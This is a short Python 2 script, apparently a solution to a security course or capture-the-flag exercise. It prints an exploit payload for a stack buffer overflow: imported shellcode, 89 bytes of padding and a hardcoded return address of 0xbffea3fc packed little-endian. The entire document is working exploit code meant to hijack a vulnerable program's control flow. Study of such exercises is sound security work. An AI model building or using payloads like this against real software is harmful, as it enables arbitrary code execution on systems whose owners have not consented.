from shellcode import shellcode
from struct import pack
print shellcode + '\xaa'*89 + pack("<I", 0xbffea3fc) 